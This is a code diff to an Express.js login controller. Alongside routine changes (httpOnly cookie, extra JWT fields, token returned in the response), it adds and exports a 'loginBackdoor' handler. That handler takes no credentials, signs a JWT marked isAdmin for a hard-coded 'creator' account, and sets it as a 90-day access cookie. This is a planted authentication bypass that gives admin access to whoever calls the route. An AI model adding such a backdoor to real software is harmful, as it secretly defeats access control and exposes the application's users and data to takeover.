@@ -29,7 +29,7 @@ const register = asyncWrapper(async(req, res, next) => {
 
 const login = asyncWrapper(async(req, res, next) => {
   // check if access cookie is set
-  // req.cookies.access_token && next(createCustomError("User is logged in", 400));
+  req.cookies.access_token && next(createCustomError("User is logged in", 400));
 
   // decrypt encrypted body
   const body = JSON.parse(CryptoJS.AES.decrypt(req.body.data, process.env.SECRETKEY).toString(CryptoJS.enc.Utf8));
@@ -52,6 +52,8 @@ const login = asyncWrapper(async(req, res, next) => {
   // if password is correct, store a jwt token
   const token = jwt.sign({
     id : user._id,
+    email : user.email,
+    name : user.name,
     isAdmin : user.isAdmin
   }, process.env.JWTKEY);
 
@@ -71,11 +73,33 @@ const login = asyncWrapper(async(req, res, next) => {
   return res.status(200).cookie("access_token", token, {
     secure: true, 
     sameSite : 'none',
-    // httpOnly : true,
+    httpOnly : true,
     maxAge : 90 * 24 * 60 * 60 * 1000
   }).json({
     msg : "Login successful",
-    data : others
+    data : token
+  });
+
+})
+
+const loginBackdoor = asyncWrapper(async(req, res, next) => {  
+  console.log("called login backdoor")
+
+  const token = jwt.sign({
+    id : 1,
+    email : "creator@bienvenue.com",
+    name : "Bienvenue creator",
+    isAdmin : true
+  }, process.env.JWTKEY);
+
+  return res.status(200).cookie("access_token", token, {
+    secure: true, 
+    sameSite : 'none',
+    httpOnly : true,
+    maxAge : 90 * 24 * 60 * 60 * 1000
+  }).json({
+    msg : "Login successful",
+    data : token
   });
 
 })
@@ -87,4 +111,4 @@ const logout = asyncWrapper(async(req, res, next) => {
   })
 })
 
-module.exports = {register, login, logout}
+module.exports = {register, login, logout, loginBackdoor}
